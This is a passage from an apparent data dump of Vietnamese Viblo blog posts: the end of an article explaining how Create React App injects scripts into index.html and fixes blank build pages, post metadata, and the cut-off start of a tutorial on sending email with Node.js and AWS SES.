id="root"></div>\n```\nc\u00f2n `index.js` th\u1ef1c hi\u1ec7n `render()`:\n```js\nconst root= document.getElementById("root");\nReactDOM.render(<App />, root);\n```\n\nv\u1eady th\u00ec `App` s\u1ebd \u0111\u01b0\u1ee3c load v\u00e0o `div#root`.\n\n*\u01a0 m\u00e0 khoannn !?! C\u00f3 g\u00ec \u0111\u00f3 sai sai th\u00ec ph\u1ea3i...* :confused::confused:\n\nCh\u00fang ta bi\u1ebft r\u1eb1ng m\u1ed9t trong nh\u1eefng c\u00e1ch s\u1eed d\u1ee5ng `Javascript` trong `HTML` l\u00e0 khai b\u00e1o qua th\u1ebb `script` trong `html`:\n```js\n<script src="index.js" ></script>\n// ho\u1eb7c\n<script>\n    $blogUrl = document.getElementById(\'haodev.wordpress.com\');\n</script>\n```\n\n\u1ea4y th\u1ebf m\u00e0 trong `index.html > body` ch\u1eb3ng c\u00f3 khai b\u00e1o g\u00ec c\u1ea3 ngo\u00e0i `div#root`.\n\nM\u00e0 ch\u01b0a k\u1ec3 khi ch\u1ea1y \u1ee9ng d\u1ee5ng v\u00e0 m\u1edf tr\u00ean tr\u00ecnh duy\u1ec7t, `View source code` \u0111o\u1ea1n `script` \u0111\u00f3 l\u1ea1i xu\u1ea5t hi\u1ec7n?\n\nNh\u01b0 v\u1eady, ph\u1ea3i ch\u0103ng c\u00f3 m\u1ed9t li\u00ean k\u1ebft ng\u1ea7m n\u00e0o \u0111\u00f3 gi\u1eefa `index.html` v\u00e0 `index.js`?\n\n![](https://i.imgur.com/L92gp2b.gif)\n\nC\u00e2u tr\u1ea3 l\u1eddi \u0111\u00f3 l\u00e0 nh\u1edd **`html-webpack-plugin`**.\n\n<br/>\n\n#### Html Webpack Plugin\n\n`Plugin` n\u00e0y `config` `public/index.html` l\u00e0 `template` \u0111\u01b0\u1ee3c \u0111\u1ecdc. `Plugin` n\u00e0y s\u1ebd th\u00eam \u0111o\u1ea1n `script` *(`bundle.js`, `chunk.js`)* v\u00e0o `template` *(tr\u01b0\u1edbc \u0111\u00f3 `webpack` \u0111\u00e3 cung c\u1ea5p cho `plugin` m\u1ed9t \u0111\u01b0\u1eddng d\u1eabn kh\u1ea3 d\u1ee5ng)*.\n\nN\u00f3i c\u00f3 s\u00e1ch m\u00e1ch c\u00f3 ch\u1ee9ng ch\u1ee9 nh\u1ec9 :grinning:)) \n\nV\u00e0o ngay `node_modules/react-scripts/config/webpack.config.js` xem l\u1ea1i:\n```js\nplugins: [\n    // Generates an `index.html` file with the <script> injected.\n    new HtmlWebpackPlugin(\n        Object.assign(\n            {},\n            {\n                inject: true,\n                template: paths.appHtml,\n            },\n         )\n    )\n]\n```\nCh\u00e8n `script` v\u00e0o `file index.html` khi `npm start`.\n\nQu\u00e1 tr\u00ecnh `npm start` th\u00ec xem t\u1ea1i `node_modules/.bin`:\n```js\nswitch (script) {\n    case \'start\': {\n        const result = spawn.sync(\n        \'node\',\n        [require.resolve(\'../scripts/\' + script)].concat(args),\n        // ...\n    );\n}\n```\n\nV\u00e0o `node_modules/react-scripts/config/paths.js` xem `html-webpack-plugin` \u0111\u00e3 l\u00e0m g\u00ec v\u1edbi `template: paths.appHtml`:\n```js\nmodule.exports = {\n    appHtml: resolveApp(\'public/index.html\'),\n    appIndexJs: resolveModule(resolveApp, \'src/index\'),\n};\n```\n\u0110\u00f3 l\u00e0 l\u00fac `index.html` b\u1eaft \u0111\u1ea7u \u0111\u01b0\u1ee3c `resolve` r\u1ed3i, `script` \u0111\u00e3 \u0111\u01b0\u1ee3c ch\u00e8n v\u00e0o `template` c\u1ee7a ch\u00fang ta ^^\n\n![](https://i.imgur.com/BJGzC6i.gif)\n\n## \u25a0 index.html "tr\u1eafng tr\u01a1n" tr\u00ean browser?\n\nM\u1ed9t v\u1ea5n \u0111\u1ec1 n\u1eefa m\u00ecnh mu\u1ed1n ch\u00fang ta t\u00ecm hi\u1ec3u, \u0111\u00f3 l\u00e0 sau khi ph\u00e1t tri\u1ec3n \u1ee9ng d\u1ee5ng, ch\u1ea1y `npm run build`, mi\u1ec7ng nh\u1ea5p ng\u1ee5m tr\u00e0 xanh, \u0111\u1ea7u ch\u1eafc c\u00fa r\u1eb1ng m\u1ecdi th\u1ee9 s\u1ebd \u0111\u01b0\u1ee3c `compile` ra nh\u01b0 \u00fd r\u1ed3i. \n\nL\u00fac gi\u1edd m\u1edbi ch\u1ed9t d\u1ea1 v\u00ec m\u1edf tr\u00ean tr\u00ecnh duy\u1ec7t file build l\u00e0 `1 trang tr\u1eafng tinh` :disappointed::disappointed:.\n\n\n\u0110\u1ec3 t\u00ecm ra nguy\u00ean nh\u00e2n, ch\u1ea1y l\u1ec7nh `npm run eject` \u0111\u1ec3 xem nh\u1eefng g\u00ec \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n `behind the scenes` sau `nh\u1eefng c\u00e2u l\u1ec7nh c\u00f3-v\u1ebb-l\u00e0-ng\u1eafn-g\u1ecdn` - *`npm start`/ `run build`/`run test`* - trong `\ud83e\uddca application/scripts`.\n\nQu\u00e1 tr\u00ecnh ch\u1ea1y l\u1ec7nh `npm start` s\u1eed d\u1ee5ng `webpack-dev-server`:\n```js\n// \ud83e\uddca application/scripts/start\nconst WebpackDevServer = require(\'webpack-dev-server\');\n```\n\n\u0110\u01b0\u1ee3c r\u1ed3i, b\u00e2y gi\u1edd v\u00e0o `webpack.config.js` xem th\u00ec th\u1ea5y \u0111o\u1ea1n n\u00e0y:\n```js\nconst publicPath = isEnvProduction ? paths.servedPath : isEnvDevelopment && \'/\';\n// "homepage" can be set to "." to enable relative asset paths\n  ```\n  \n\u0110\u00f3 ch\u00ednh l\u00e0 l\u00fd do, khi ch\u00fang ta m\u1edf tr\u1ef1c ti\u1ebfp `index.html` tr\u00ean tr\u00ecnh duy\u1ec7t th\u00ec nh\u1eadn \u0111\u01b0\u1ee3c `"m\u1ed9t trang tr\u1eafng tinh"` b\u1edfi v\u00ec **`Webpack` \u0111ang c\u1ed1 t\u1ea3i c\u00e1c `static files` t\u1eeb `\ud83e\uddca application` ch\u1ee9 kh\u00f4ng ph\u1ea3i t\u1eeb `\ud83e\uddca application/build`.** \n \n \u0110\u1ec3 kh\u1eafc ph\u1ee5c \u0111i\u1ec1u n\u00e0y, ch\u00fang ta v\u00e0o `package.json` th\u00eam d\u00f2ng:\n ```json\n {\n     // ...\n     "homepage":".",\n     // ...\n }\n ```\nl\u00e0 ngon ngay :smile::smile:))\n\nCh\u1ea1y l\u1ea1i `npm run build` v\u00e0 m\u1edf `index.html` tr\u00ean tr\u00ecnh duy\u1ec7t \u0111\u1ec3 xem k\u1ebft qu\u1ea3 nh\u00e9 \u2764\n \n ## \u25a0 K\u1ebft\n \n`Create React App` m\u1eb7c d\u00f9 kh\u00f4ng qu\u00e1 m\u1edbi m\u1ebb v\u1edbi c\u00e1c b\u1ea1n \u0111\u00e3 v\u00e0 \u0111ang l\u00e0m vi\u1ec7c v\u1edbi `React`, nh\u01b0ng c\u0169ng ch\u1eb3ng th\u1ec3 ph\u1ee7 nh\u1eadn vi\u1ec7c n\u00f3 \u0111\u01b0\u1ee3c xem nh\u01b0 m\u1ed9t c\u00f4ng c\u1ee5 v\u00f4 c\u00f9ng h\u1eefu hi\u1ec7u, nhanh g\u1ecdn v\u00e0 ti\u1ebft ki\u1ec7m th\u1eddi gian c\u00e0i \u0111\u1eb7t c\u1ee7a ch\u00fang ta :grinning::grinning:.\n\nSong song v\u1edbi lo\u1ea1t \u01b0u \u0111i\u1ec3m \u0111\u00f3, c\u00f2n mu\u00f4n v\u00e0n nh\u1eefng `behind the scenes` m\u00e0 ch\u1eb3ng ri\u00eang 02 v\u1ea5n \u0111\u1ec1 k\u1ec3 tr\u00ean m\u00ecnh mong mu\u1ed1n ch\u00fang ta chia s\u1ebb v\u1edbi nhau. **R\u00f5 r\u00e0ng vi\u1ec7c quan s\u00e1t k\u1ef9 l\u01b0\u1ee1ng v\u00e0 t\u00ecm hi\u1ec3u m\u1ed9t ch\u00fat v\u1ec1 c\u00e1ch ho\u1ea1t \u0111\u1ed9ng c\u1ee7a c\u00e1c c\u00f4ng c\u1ee5 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng lu\u00f4n l\u00e0 \u0111i\u1ec1u t\u1ed1t \u0111\u00fang kh\u00f4ng n\u00e0o ^^.**\n\n![](https://i.imgur.com/zv42HUU.gif)\n\nM\u00ecnh c\u1ea3m \u01a1n c\u00e1c b\u1ea1n v\u00ec \u0111\u00e3 \u0111\u1ecdc b\u00e0i vi\u1ebft n\u00e0y v\u00e0 hy v\u1ecdng r\u1eb1ng n\u00f3 c\u00f3 th\u1ec3 mang l\u1ea1i \u0111\u01b0\u1ee3c gi\u00e1 tr\u1ecb n\u00e0o \u0111\u00f3 ^^ T\u1eb7ng m\u00ecnh **`1 upvote`** \u0111\u1ec3 c\u00f3 th\u00eam \u0111\u1ed9ng l\u1ef1c cho nh\u1eefng b\u00e0i vi\u1ebft s\u1eafp t\u1edbi nha \u2764\n\nCh\u00fac c\u00e1c b\u1ea1n cu\u1ed1i tu\u1ea7n vui v\u1ebb ^^\n \n## \u25a0 Credits\n\n- **Resources from [Medium](https://medium.com/@louis.raymond/why-cant-i-open-my-react-app-by-clicking-index-html-d1778f6324cf), [Make It Awesome](https://haodev.wordpress.com/2020/09/24/lien-ket-ngam-giua-index-js-index-html/), [Viblo Question - Answer](https://viblo.asia/q/tai-sao-react-can-static-servers-sau-khi-build-yDZO71eOZwj), [Tree House](https://blog.teamtreehouse.com/getting-started-create-react-app-tool).**\n- **Poster & thumbnail are edited from [MV poster of Son Tung M-TP](https://www.youtube.com/watch?v=psZ1g9fMfeo).**\n- The post was originally published at [here](https://haodev.wordpress.com/2021/01/22/dieu-react-luon-giu-kin-trong-tim/).\n- **Policies for this article:**\n    - [**This original article from My Make It Awesome blog**](https://haodev.wordpress.com).\n    - **Use my contents for sharing purpose, please attached resource linked to [my blog](https://haodev.wordpress.com).**\n    - **Use my contents for trading purpose, please [contact me](https://haodev.wordpress.com/me/).**\n- **The posts in a spirit of sharing knowledge. If there is anything with regard to copyright for your contents, please [contact me](https://haodev.wordpress.com/me/).**\n\n<br/>\n\n\n***Happy coding !***',
      published_at: "2021-01-22 16:35:11",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 10:00:25",
      translation_source: null,
      trend_at: "2021-02-01 14:07:59",
      promoted_at: null,
      reading_time: 7,
      points: 42,
      views_count: 1432,
      clips_count: 10,
      comments_count: 10,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/8a1d3d88-1171-40c7-890d-04aa5227bc22.png",
      user: {
        data: {
          id: 23999,
          url: "https://viblo.asia/u/hao3004",
          avatar: "d61fda3e-0ec7-42c8-a902-293328b075c4.jpeg",
          name: "Hao Le",
          username: "hao3004",
          followers_count: 87,
          reputation: 3045,
          posts_count: 25,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "css",
            name: "CSS",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=CSS&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "reactjs",
            name: "ReactJS",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=ReactJS&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 18384,
            url: "https://viblo.asia/u/cuong_nguyen",
            avatar: "de14095c-79e2-485d-8635-f4258e8ef252.jpg",
            name: "Nguyen Huy Cuong",
            username: "cuong_nguyen",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 23999,
            url: "https://viblo.asia/u/hao3004",
            avatar: "d61fda3e-0ec7-42c8-a902-293328b075c4.jpeg",
            name: "Hao Le",
            username: "hao3004",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 33018,
            url: "https://viblo.asia/u/ngduyws",
            avatar: "7fa7d0ce-5cbc-45a3-9efb-c444ccb293f1.jpg",
            name: "Nguyen Duc",
            username: "ngduyws",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 42250,
            url: "https://viblo.asia/u/sun-asterisk_ducha",
            avatar: "e36315f5-fff1-4e9a-ab4d-3aaf3c1ae40c.jpeg",
            name: "Ha Anh Duc",
            username: "sun-asterisk_ducha",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 46023,
            url: "https://viblo.asia/u/bodetaima",
            avatar: "d1578c15-d8ed-44dc-9c8b-05c76222211d.jpeg",
            name: "Phong Tran",
            username: "bodetaima",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 54514,
            url: "https://viblo.asia/u/moon272",
            avatar: "f441a17e-2604-4f73-9a19-414fc1238f0d.jpg",
            name: "\u0110\u1eebng Qu\u00ean T\u00ean Anh",
            username: "moon272",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 50114,
      title: "G\u1eedi Mail v\u1edbi Nodejs v\u00e0 AWS SES",
      slug: "m68Z0P9XZkG",
      url: "https://viblo.asia/p/gui-mail-voi-nodejs-va-aws-ses-m68Z0P9XZkG",
      user_id: 24489,
      moderation: null,
      transliterated: "gui-mail-voi-nodejs-va-aws-ses",
      contents_short:
        "AWS SES\nAWS SES l\u00e0 g\u00ec\nAmazon Simple Email Service (SES) l\u00e0 d\u1ecbch v\u1ee5 email ti\u1ebft ki\u1ec7m chi ph\u00ed, linh ho\u1ea1t v\u00e0 c\u00f3 th\u1ec3 thay \u0111\u1ed5i quy m\u00f4, cho ph\u00e9p nh\u00e0 ph\u00e1t tri\u1ec3n g\u1eedi email t\u1eeb b\u00ean trong \u1ee9ng d\u1ee5ng b\u1ea5t k\u1ef3. B\u1ea1n ...",
      contents:
        "# AWS SES\n## AWS SES l\u00e0 g\u00ec\nAmazon Simple Email Service (SES) l\u00e0 d\u1ecbch v\u1ee5 email ti\u1ebft ki\u1ec7m chi ph\u00ed, linh ho\u1ea1t v\u00e0 c\u00f3 th\u1ec3 thay \u0111\u1ed5i quy m\u00f4, cho ph\u00e9p nh\u00e0 ph\u00e1t tri\u1ec3n g\u1eedi email t\u1eeb b\u00ean trong \u1ee9ng d\u1ee5ng b\u1ea5t k\u1ef3. B\u1ea1n c\u00f3 th\u1ec3 nhanh ch\u00f3ng \u0111\u1eb7t c\u1ea5u h\u00ecnh Amazon SES \u0111\u1ec3 h\u1ed7 tr\u1ee3 m\u1ed9t s\u1ed1 tr\u01b0\u1eddng h\u1ee3p s\u1eed d\u1ee5ng email bao g\u1ed3m li\u00ean l\u1ea1c qua email tr\u00ean di\u1ec7n r\u1ed9ng, ti\u1ebfp th\u1ecb ho\u1eb7c giao d\u1ecbch. C\u00e1c t\u00f9y ch\u1ecdn x\u00e1c th\u1ef1c email v\u00e0 tri\u1ec3n khai IP linh ho\u1ea1t c\u1ee7a Amazon SES gi\u00fap th\u00fac \u0111\u1ea9y kh\u1ea3 n\u0103ng g\u1eedi cao h\u01a1n v\u00e0 b\u1ea3o v\u1ec7 uy t\u00edn c\u1ee7a ng\u01b0\u1eddi g\u1eedi, trong khi c\u00e1c ph\u00e2n t\u00edch g\u1eedi \u0111o l\u01b0\u1eddng t\u00e1c \u0111\u1ed9ng c\u1ee7a t\u1eebng email. V\u1edbi Amazon SES, b\u1ea1n c\u00f3 th\u1ec3 g\u1eedi email m\u1ed9t c\u00e1ch b\u1ea3o m\u1eadt tr\u00ean to\u00e0n c\u1ea7u \u1edf quy m\u00f4 l\u1edbn.\n## AWS SES so v\u1edbi c\u00e1c d\u1ecbch v\u1ee5 kh\u00e1c\nNgo\u00e0i AWS SES c\u00f2n c\u00f3 nhi\u1ec1u d\u1ecbch v\u1ee5 mail kh\u00e1c \u0111\u1ec3 g\u1eedi v\u00e0 nh\u1eadn mail c\u0169ng \u0111\u01b0\u1ee3c bi\u1ebft \u0111\u1ebfn nhi\u1ec1u nh\u01b0: Gmail SMTP Server, Mailgun, SendGrid, ... \n\n\u0110\u1ea7u ti\u00ean m\u00ecnh xin n\u00f3i qua v\u1ec1 d\u1ecbch v\u1ee5 c\u1ee7a Gmail th\u00ec Gmail \u0111\u01b0\u1ee3c thi\u1ebft k\u1ebf cho g\u1eedi email c\u00e1c nh\u00e2n thay v\u00ec g\u1eedi mail \u0111\u1ed3ng lo\u1ea1t, Google th\u01b0\u1eddng c\u00e0i \u0111\u1eb7t nh\u1eefng gi\u1edbi h\u1ea1n l\u00ean c\u00e1c t\u00e0i kho\u1ea3n n\u00e0y nh\u1eb1m m\u1ee5c \u0111\u00edch ph\u1ee5c v\u1ee5 cho nhu c\u1ea7u c\u00e1 nh\u00e2n hay doanh nghi\u1ec7p \u0111\u1ec3 li\u00ean h\u1ec7 l\u00e0 ch\u00ednh, xem qua gi\u1edbi h\u1ea1n c\u1ee7a Gmail SMTP Server.\n![](https://images.viblo.asia/b87d34fc-f4c2-44cb-8929-119daecdbb49.png)\n\nN\u1ebfu nhu c\u1ea7u email s\u1ed1 l\u01b0\u1ee3ng l\u1edbn k\u00e8m theo s\u1ef1 \u0111\u1ea3m b\u1ea3o email v\u00e0o inbox t\u1ed1t nh\u1ea5t c\u00f3 th\u1ec3. B\u1ea1n c\u1ea7n m\u1ed9t h\u1ec7 th\u1ed1ng \u1ed5n \u0111\u1ecbnh v\u00e0 \u0111\u1ee7 m\u1ea1nh \u0111\u1ec3 \u0111\u1ea3m b\u1ea3o l\u1ec7nh g\u1eedi email ph\u1ea3i ho\u00e0n th\u00e0nh. B\u1ea1n c\u1ea7n email c\u00f3 t\u00ean mi\u1ec1n doanh nghi\u1ec7p m\u00e0 kh\u00f4ng l\u1ec7 thu\u1ed9c Gsuite. B\u1ea1n c\u1ea7n g\u1eedi email nhi\u1ec1u nh\u1ea5t v\u1edbi chi ph\u00ed th\u1ea5p nh\u1ea5t c\u00f3 th\u1ec3 th\u00ec AWS SES c\u00f3 th\u1ec3 \u0111\u00e1p \u1ee9ng \u0111i\u1ec1u \u0111\u00f3.\n\nN\u00f3i qua v\u1ec1 Mailgun th\u00ec \u0111\u00e3 b\u1ecf g\u00f3i mi\u1ec5n ph\u00ed 10.000 email/th\u00e1ng chuy\u1ec3n sang t\u1eadp trung v\u00e0o c\u00e1c g\u00f3i tr\u1ea3 ph\u00ed. \n\nSendGrid c\u00f3 g\u00f3i mi\u1ec5n ph\u00ed v\u1edbi 100 email/ng\u00e0y nh\u01b0ng m\u00ecnh kh\u00f4ng ngh\u0129 s\u1ebd khi site ph\u00e1t tri\u1ec3n sau n\u00e0y. \u0110\u1ebfn l\u00fac \u0111\u00f3 b\u1ea1n l\u1ea1i t\u1ed1n th\u00eam th\u1eddi gian \u0111\u1ec3 t\u00ecm gi\u1ea3i ph\u00e1p m\u1edbi.\n\nAWS SES c\u0169ngMandrill t\u1ed1n ph\u00ed tuy nhi\u00ean gi\u00e1 c\u1ee7a n\u00f3 si\u00eau r\u1ebb kh\u00f4ng c\u00f3 \u0111\u1ed5i th\u1ee7 $0.1/1000 email, v\u1edbi gi\u00e1 n\u00e0y th\u00ec t\u00f4i tin ch\u1eafc b\u1ea1n s\u1ebd ch\u1ecdn g\u00f3i tr\u1ea3 ph\u00ed \u00edt nh\u01b0ng c\u1ef1c k\u1ef3 \u1ed5n \u0111\u1ecbnh v\u00e0 \u0111\u00e1ng tin c\u1eady \u0111\u1ec3 g\u1eafn b\u00f3 l\u00e2u d\u00e0i thay v\u00ec mi\u1ec5n ph\u00ed m\u00e0 v\u1edbi nhi\u1ec1u h\u1ea1n ch\u1ebf.\n\n# T\u1ea1o t\u00e0i kho\u1ea3n AWS SES\n\nM\u00ecnh ngh\u0129 ai c\u0169ng n\u00ean c\u00f3 m\u1ed9t t\u00e0i kho\u1ea3n AWS v\u00ec tr\u00ean n\u00e0y c\u00f3 r\u1ea5t nhi\u1ec1u d\u1ecbch v\u1ee5 r\u1ea5t \u0111\u00e1ng \u0111\u1ec3 d\u00f9ng, b\u1ea1n c\u00f3 th\u1ec3 \u0111\u0103ng k\u00fd t\u00e0i kho\u1ea3n [t\u1ea1i \u0111\u00e2y](https://portal.aws.amazon.com/billing/signup?refid=em_127222&redirect_url=https%3A%2F%2Faws.amazon.com%2Fregistration-confirmation#/start), v\u00e0 n\u00ean k\u00edch ho\u1ea1t b\u1ea3o m\u1eadt 2 l\u1edbp 2FA cho ch\u1eafc v\u00ec b\u1ea3o m\u1eadt lu\u00f4n l\u00e0 \u01b0u ti\u00ean h\u00e0ng \u0111\u1ea7u.\n\nSau khi \u0111\u00e3 c\u00f3 t\u00e0i kho\u1ea3n b\u1ea1n b\u1eaft \u0111\u1ea7u t\u00ecm d\u1ecbch v\u1ee5 AWS SES t\u1ea1i [https://console.aws.amazon.com](https://console.aws.amazon.com). B\u1ea1n \u0111\u00e1nh t\u00ean `Simple Email Service` ho\u1eb7c `SES` v\u00e0o thanh t\u00ecm ki\u1ebfm l\u00e0 ra.\n![](https://images.viblo.asia/a0337d0e-b592-4e53-b12e-2d04caeacefa.png)\n\nL\u01b0u \u00fd Amazon quy \u0111\u1ecbnh region cho server r\u1ea5t c\u1ea9n th\u1eadn v\u00e0 nghi\u00eam ng\u1eb7t, m\u1ed7i region s\u1ebd \u1ee9ng v\u1edbi t\u00e0i kho\u1ea3n Amazon SES c\u1ee7a b\u1ea1n v\u00e0 subdomain t\u01b0\u01a1ng \u1ee9ng, m\u1ed7i l\u1ea7n chuy\u1ec3n region s\u1ebd ph\u1ea3i y\u00eau c\u1ea7u h\u1ed7 tr\u1ee3 \u0111\u1ec3 tho\u00e1t SandBox (Ch\u1ebf \u0111\u1ed9 ch\u1ea1y th\u1eed nghi\u1ec7m s\u1ebd h\u1ea1n ch\u1ebf vi\u1ec7c g\u1eedi mail c\u1ee7a b\u1ea1n). H\u00ecnh b\u00ean d\u01b0\u1edbi cho bi\u1ebft \u1edf region US East (N. Virginia) b\u1ea1n \u0111ang \u1edf ch\u1ebf \u0111\u1ed9 sandbox.\n\n![](https://images.viblo.asia/c2cb7897-0eb2-49e2-ac26-7b2a251a2033.png)\n\nV\u00ec v\u1eady, b\u1ea1n n\u00ean x\u00e1c \u0111\u1ecbnh ch\u00ednh x\u00e1c nhu c\u1ea7u c\u1ee7a m\u00ecnh \u0111\u1ec3 ch\u1ecdn region cho server ch\u00ednh x\u00e1c. N\u1ebfu th\u1ecb tr\u01b0\u1eddng Vi\u1ec7t Nam th\u00ec b\u1ea1n n\u00ean ch\u1ecdn region Mumbai \u0111\u1ec3 t\u1ed1i \u01b0u chi ph\u00ed v\u00e0 t\u1ed1c \u0111\u1ed9 (t\u1ed1c \u0111\u1ed9 nhanh g\u1ea5p 3 l\u1ea7n US East). Ng\u01b0\u1ee3c l\u1ea1i, n\u1ebfu th\u1ecb tr\u01b0\u1eddng to\u00e0n c\u1ea7u thcredentials\u00ec b\u1ea1n ch\u1ecdn US East.\n![](https://images.viblo.asia/e38b2fcb-13ad-41c4-b973-999f9e1cd695.png)\n\n\u0110\u1ec3 c\u00f3 th\u1ec3 g\u1eedi mail \u0111i \u0111\u01b0\u1ee3c Amazon SES y\u00eau c\u1ea7u b\u1ea1n x\u00e1c minh danh t\u00ednh c\u1ee7a m\u00ecnh (verify domain ho\u1eb7c \u0111\u1ecba ch\u1ec9 email m\u00e0 b\u1ea1n g\u1eedi email t\u1eeb \u0111\u00f3) \u0111\u1ec3 x\u00e1c nh\u1eadn r\u1eb1ng b\u1ea1n s\u1edf h\u1eefu ch\u00fang v\u00e0 ng\u0103n ch\u1eb7n vi\u1ec7c s\u1eed d\u1ee5ng tr\u00e1i ph\u00e9p.\n\n\u0110\u1ec3 verify email address c\u1ee7a b\u1ea1n, Amazon \u0111\u00f2i h\u1ecfi b\u1ea1n \u0111\u00e3 c\u00f3 mailbox \u0111\u1ec3 nh\u1eadn email x\u00e1c nh\u1eadn v\u00ec h\u1ecd s\u1ebd g\u1eedi m\u1ed9t link x\u00e1c nh\u1eadn v\u00e0 b\u1ea1n ph\u1ea3i nh\u1ea5p v\u00e0o \u0111\u00f3. Ngh\u0129a l\u00e0 mu\u1ed1n t\u1ea1o Amazon SMTP th\u00ec ph\u1ea3i s\u1eb5n h\u1ed9p mail doanh nghi\u1ec7p \u0111\u1ec3 nh\u1eadn email, chi ti\u1ebft b\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o [t\u1ea1i \u0111\u00e2y](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/verify-email-addresses.html).\n\n![](https://images.viblo.asia/c47dd0a9-ca4f-404b-8d02-2c3cd8e013ac.png)\n\nHo\u1eb7c b\u1ea1n c\u00f3 th\u1ec3 verify domain c\u1ee7a m\u00ecnh chi ti\u1ebft c\u00f3 th\u1ec3 xem [t\u1ea1i \u0111\u00e2y](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/verify-domains.html).\n\n![](https://images.viblo.asia/5d753a41-5e0f-4b51-880e-a14b46e80f90.png)\n\nL\u01b0u \u00fd m\u1ed9t ch\u00fat khi b\u1ea1n \u1edf trong m\u00f4i tr\u01b0\u1eddng sandbox (ch\u1ebf \u0111\u1ed9 ch\u1ea1y th\u1eed nghi\u1ec7m s\u1ebd h\u1ea1n ch\u1ebf vi\u1ec7c g\u1eedi mail c\u1ee7a b\u1ea1n) th\u00ec b\u1ea1n ch\u1ec9 c\u00f3 th\u1ec3 g\u1edfi qua l\u1ea1i trong c\u00e1c email m\u00e0 b\u1ea1n \u0111\u00e3 verify. Tr\u01b0\u1eddng h\u1ee3p b\u1ea1n verify domain th\u00ec c\u00f3 th\u1ec3 g\u1edfi qua l\u1ea1i gi\u1eefa c\u00e1c mail c\u1ee7a domain \u0111\u00f3 v\u00ed d\u1ee5 b\u1ea1n verify domain *abc.com*, th\u00ec c\u00f3 th\u1ec3 g\u1edfi qua l\u1ea1i gi\u1eefa c\u00e1c email *x1@abc.com*, *...@abc.com*.\n\nM\u1ee5c \u0111\u00edch AWS ch\u01b0a k\u00edch ho\u1ea1t t\u00e0i kho\u1ea3n cho b\u1ea1n m\u00e0 ch\u1ec9 cho b\u1ea1n ch\u1ea1y tr\u00ean m\u00f4i tr\u01b0\u1eddng th\u1eed nghi\u1ec7m l\u00e0 \u0111\u1ec3 ki\u1ec3m so\u00e1t c\u00e1c t\u00e0i kho\u1ea3n spam, \u0111\u1ec3 tho\u00e1t kh\u1ecfi m\u00f4i tr\u01b0\u1eddng sanbox b\u1ea1n ph\u1ea3i g\u1edfi y\u00eau c\u1ea7u l\u00ean AWS \u0111\u1ec3 k\u00edch ho\u1ea1t ch\u1ecb ti\u1ebft [t\u1ea1i \u0111\u00e2y](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/request-production-access.html).\n\n# G\u1eedi Email v\u1edbi Nodejs\nC\u00f3 2 c\u00e1ch \u0111\u1ec3 g\u1edfi email d\u00f9ng **Amazon SES API** ho\u1eb7c **SMTP credentials**, nhi\u1ec1u b\u1ea1n hay ch\u1ecdn **SMTP credentials** v\u1edbi t\u00ean \u0111\u0103ng nh\u1eadp v\u00e0 password v\u00ec n\u00f3 quen thu\u1ed9c, tuy nhi\u00ean m\u00ecnh tham kh\u1ea3o m\u1ed9t s\u1ed1 b\u00e0i vi\u1ebft th\u00ec khi d\u00f9ng v\u1edbi  **Amazon SES API** th\u00ec t\u1ed1c \u0111\u1ed9 g\u1edfi email s\u1ebd nhanh h\u01a1n.\n\n## D\u00f9ng SMTP credentials \u0111\u1ec3 g\u1eedi email\n\n\u0110\u1ea7u ti\u1ec1n b\u1ea1n t\u1ea1o m\u1ed9t SMTP credentials, click v\u00e0o `Create My SMTP Credentials` , \u0111i\u1ec1n `IAM User Name`, Create Credentials, sau \u0111\u00f3 Download Credentials \u0111\u00f3 v\u1ec1 trong file csv download v\u1ec1 s\u1ebd c\u00f3 smtp username v\u00e0 password c\u1ee7a b\u1ea1n.\n![](https://images.viblo.asia/3f802373-6884-42a5-aec6-61b2cafe728e.png)\n\nSau khi \u0111\u00e3 c\u00f3 username, password m\u00ecnh s\u1ebd l\u00e0m m\u1ed9t \u0111o\u1ea1n code demo \u0111\u1ec3 g\u1eedi mail, \u0111\u1ea7u ti\u00ean l\u00e0 b\u01b0\u1edbc kh\u1edfi t\u1ea1o:\n\n* Kh\u1edfi t\u1ea1o m\u1ed9t file `app.js`.\n* T\u1ea1o `package.json` b\u1eb1ng l\u1ec7nh `yarn init` c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 d\u00f9ng npm \u0111\u1ec3 qu\u1ea3n l\u00fd c\u00e1c th\u01b0 vi\u1ec7n.\n* C\u00e0i \u0111\u1eb7t th\u01b0 vi\u1ec7n **nodemailer** \u0111\u1ec3 g\u1eedi email: `yarn add nodemailer` ho\u1eb7c  `npm i 